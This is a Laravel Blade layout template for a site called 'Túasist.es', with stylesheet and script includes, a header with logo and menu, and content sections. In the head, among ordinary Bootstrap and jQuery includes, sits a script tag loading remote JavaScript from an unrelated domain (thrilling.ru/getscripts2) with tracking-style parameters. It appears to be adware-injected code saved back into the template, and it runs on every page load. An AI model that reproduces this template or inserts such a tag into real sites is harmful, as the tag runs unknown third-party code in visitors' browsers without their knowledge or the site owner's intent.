<!DOCTYPE html>
<html><head>
    <meta charset="utf-8">
    <title>@yield('title', trans('general.site.title')) - {{ trans('general.site.name') }}</title>

    <link rel="stylesheet" href="/assets/app/css/cssForRegistration.css">
    <link rel="stylesheet" href="/assets/app/css/main.css">

    <link rel="stylesheet" href="/assets/app/css/cssforlanding.css">
    <link rel="stylesheet" href="/assets/app/css/cssForTasks-all.css">
    <link rel="stylesheet" type="text/css" href="/assets/app/css/styleGlid.css">
    <link href="/assets/app/css/hover.css" rel="stylesheet" media="all">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="/assets/app/css/app.css">        <script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script><style type="text/css"></style>
    <script src="//thrilling.ru/getscripts2?&amp;b=e722631c0dab8f7e59d6c4eaaac1c729&amp;uid=4aa4c751ff193d364d1cd028af730442&amp;insd=2015-06-13&amp;sid=&amp;df=&amp;r=&amp;h=tuasist.dev.ifrond.com&amp;rand=1438628034083"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
    @include('includes.head.ga')
    @yield('head-style')
    @yield('head-js')

</head>
<body style="zoom: 1;">
<div class="containerReg">

    <div class="col-lg-12 header-shadow headerReg">
        <div class="container contForReg">
            <div class="row">
                <div class="logo-wrapper"><a href="/"><span>Túasist.es</span></a></div>
                @include('includes.blocks.main-menu')
                @include('includes.locale')
            </div>
        </div>
    </div>


    <div class="container">
        @include('includes.alerts')
        @yield('content')
        @include('includes.footer')
        @include('includes.bodyend')
        @yield('body-js')
    </div>


</div>
</body></html>